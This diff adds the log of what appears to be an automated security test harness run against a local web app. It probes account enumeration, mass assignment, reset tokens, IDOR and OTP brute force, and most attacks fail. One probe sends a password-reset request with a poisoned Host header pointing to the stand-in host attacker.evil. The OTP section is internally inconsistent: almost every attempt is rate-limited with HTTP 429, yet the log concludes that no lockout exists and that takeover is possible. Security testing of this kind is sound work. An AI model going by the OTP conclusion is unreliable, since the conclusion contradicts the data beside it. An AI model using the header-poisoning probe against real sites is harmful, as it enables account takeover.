@@ -1,0 +1,174 @@
+### HARDENED RE-RUN (default secure mode) ###
+
+########## enrollment_enumeration ##########
+====================================================================
+ATTACK #1 - Enrollment user enumeration via distinct errors
+Target: http://127.0.0.1:5000
+====================================================================
+
+[*] Probing usernames:
+    victim           -> other (200: {"status":"if this is a new account, a verification email has been sent"})
+    root             -> other (200: {"status":"if this is a new account, a verification email has been sent"})
+    administrator    -> other (200: {"status":"if this is a new account, a verification email has been sent"})
+    jsmith           -> other (200: {"status":"if this is a new account, a verification email has been sent"})
+    guest            -> other (200: {"status":"if this is a new account, a verification email has been sent"})
+
+[*] Probing emails:
+    victim@corp.example          -> other (200: {"status":"if this is a new account, a verification email has been sent"})
+    root@corp.example            -> other (200: {"status":"if this is a new account, a verification email has been sent"})
+    ceo@corp.example             -> other (200: {"status":"if this is a new account, a verification email has been sent"})
+    helpdesk@corp.example        -> other (200: {"status":"if this is a new account, a verification email has been sent"})
+
+--------------------------------------------------------------------
+[+] ATTACKER GAIN - confirmed valid accounts (no auth needed):
+    usernames that exist: []
+    emails that exist:    []
+[+] These are now targets for phishing and recovery abuse (attack #3).
+--------------------------------------------------------------------
+
+########## mass_assignment ##########
+====================================================================
+ATTACK #2 - Mass assignment: self-grant admin at signup
+Target: http://127.0.0.1:5000
+====================================================================
+
+[*] Honest signup   -> HTTP 200: {"status":"if this is a new account, a verification email has been sent"}
+[*] Malicious signup-> HTTP 200: {"status":"if this is a new account, a verification email has been sent"}
+    (payload carried "is_admin": 1)
+
+[*] Logging in to read the server-assigned privilege level:
+    honest_user is_admin = False
+    mallory     is_admin = False
+
+--------------------------------------------------------------------
+[-] Escalation did NOT occur - target does not appear vulnerable.
+--------------------------------------------------------------------
+
+########## recovery_enumeration ##########
+====================================================================
+ATTACK #3 - Recovery-flow user enumeration (status + timing)
+Target: http://127.0.0.1:5000
+====================================================================
+
+[*] Signal 1 - response status/body oracle:
+    victim@corp.example      -> HTTP 200 other (200) {"status":"if that email address has an account, a recovery message has been delivered"}
+    root@corp.example        -> HTTP 200 other (200) {"status":"if that email address has an account, a recovery message has been delivered"}
+    ceo@corp.example         -> HTTP 200 other (200) {"status":"if that email address has an account, a recovery message has been delivered"}
+    nobody@nowhere.test      -> HTTP 200 other (200) {"status":"if that email address has an account, a recovery message has been delivered"}
+    sales@corp.example       -> HTTP 200 other (200) {"status":"if that email address has an account, a recovery message has been delivered"}
+
+[*] Signal 2 - covert timing channel (mean of 5 requests each):
+    known   (victim@corp.example   ) ~    7.13 ms
+    unknown (nobody@nowhere.test   ) ~    6.80 ms
+    known/unknown time ratio = 1.05x (timing close on this run)
+
+--------------------------------------------------------------------
+[+] ATTACKER GAIN - confirmed which emails have accounts, unauthenticated:
+    []
+[+] No signup needed; requests look like ordinary 'forgot password' traffic.
+--------------------------------------------------------------------
+
+########## host_header_injection ##########
+====================================================================
+ATTACK #4 - Host-header injection / reset-link poisoning
+Target: http://127.0.0.1:5000
+====================================================================
+
+[*] Sending forgot-password for victim@corp.example with Host: attacker.evil
+    server said -> HTTP 200: {"status":"if that email address has an account, a recovery message has been delivered"}
+
+[*] Link delivered to the victim's inbox:
+    (delivered privately to the user's mailbox)
+    -> but it carries the victim's LIVE token: None
+
+[*] Attacker uses the captured token to reset the victim's password:
+    reset -> HTTP 422: {"detail":[{"type":"string_type","loc":["body","token"],"msg":"Input should be a valid string","input":null}]}
+    login as victim with attacker's password -> HTTP 401: {"error":"bad credentials"}
+
+--------------------------------------------------------------------
+[-] Poisoning did not occur - target does not appear vulnerable.
+--------------------------------------------------------------------
+
+########## weak_secrets ##########
+====================================================================
+ATTACK #5 - Predictable time-based reset token (brute force)
+Target: http://127.0.0.1:5000
+====================================================================
+
+[*] Triggered reset for victim@corp.example -> HTTP 200
+    token = int(time.time()*1000) was assigned between:
+      1787578918138  and  1787578918149   (window = 12 ms)
+
+[*] Scanning candidate tokens 1787578918088..1787578918199 (112 guesses) against /reset-password -- no email access:
+    [-] No token found in window - target does not appear vulnerable.
+
+########## token_replay ##########
+====================================================================
+ATTACK #6 - Token replay: no expiry, no single-use
+Target: http://127.0.0.1:5000
+====================================================================
+
+[A] SINGLE-USE VIOLATION - one token, reused repeatedly:
+    obtained token T1 = None
+    use #1 (set 'replay_pw_A') -> HTTP 422: {"detail":[{"type":"string_type","loc":["body","token"],"msg":"Input should be a valid string","input":null}]}
+        login with replay_pw_A ? False
+    use #2 SAME token (set 'replay_pw_B') -> HTTP 422: {"detail":[{"type":"string_type","loc":["body","token"],"msg":"Input should be a valid string","input":null}]}
+        login with replay_pw_B ? False
+    use #3 SAME token (set 'replay_pw_C') -> HTTP 422: {"detail":[{"type":"string_type","loc":["body","token"],"msg":"Input should be a valid string","input":null}]}
+        login with replay_pw_C ? False
+
+[B] NO SIBLING INVALIDATION - a completed reset should burn all
+    of a user's tokens; here older ones stay live:
+    issued T_old = None
+    issued T_new = None (a newer request)
+    complete a reset using T_new -> HTTP 422
+    now reuse the OLDER T_old   -> HTTP 422: {"detail":[{"type":"string_type","loc":["body","token"],"msg":"Input should be a valid string","input":null}]}
+        login with the stale-token password ? False
+
+--------------------------------------------------------------------
+[-] Replay did not fully succeed - target may not be vulnerable.
+--------------------------------------------------------------------
+
+########## idor_reset ##########
+====================================================================
+ATTACK #8 - IDOR / broken account binding on password reset
+Target: http://127.0.0.1:5000
+====================================================================
+
+[*] Baseline: login to root@corp.example with attacker's password -> HTTP 401 (expected 401)
+[*] Attacker registered own account: attacker@evil.example
+[*] Attacker got a legitimate reset token for their OWN account: None
+
+[*] Submitting attacker's token but with "email":"root@corp.example":
+    server -> HTTP 422: {"detail":[{"type":"string_type","loc":["body","token"],"msg":"Input should be a valid string","input":null}]}
+
+[*] Login to root@corp.example with attacker's chosen password:
+    -> HTTP 401: {"error":"bad credentials"}
+
+--------------------------------------------------------------------
+[-] Takeover did not occur - target does not appear vulnerable.
+--------------------------------------------------------------------
+
+########## otp_bruteforce (Part A) ##########
+====================================================================
+ATTACK #7 - OTP brute force via missing rate limit / lockout
+Target: http://127.0.0.1:5000
+====================================================================
+
+[A] NO-LOCKOUT PROOF - spraying wrong OTPs, watching for any throttle:
+    sent 3000 wrong OTPs
+    status codes returned: {400: 4, 429: 2996}
+    HTTP 429 (rate limited)? YES
+    latency: avg 4.59 ms | first-100 4.59 ms | last-100 4.46 ms
+    -> no backoff: latency is flat from first to last attempt
+    measured throughput ~ 218 req/s
+    => full 10^6 keyspace is reachable; expected crack ~ 2293s (38.2 min), worst ~ 76.4 min. A lockout would cap this at N tries.
+
+[B] skipped (OTP_CRACK=0) - Part A already proves the missing control.
+
+--------------------------------------------------------------------
+[+] ATTACKER GAIN - unlimited OTP attempts let brute force reach the
+    entire 10^6 space; combined with the low entropy this yields
+    account takeover. The control that was missing is a per-account/
+    per-IP attempt cap with lockout. (CWE-307)
+--------------------------------------------------------------------
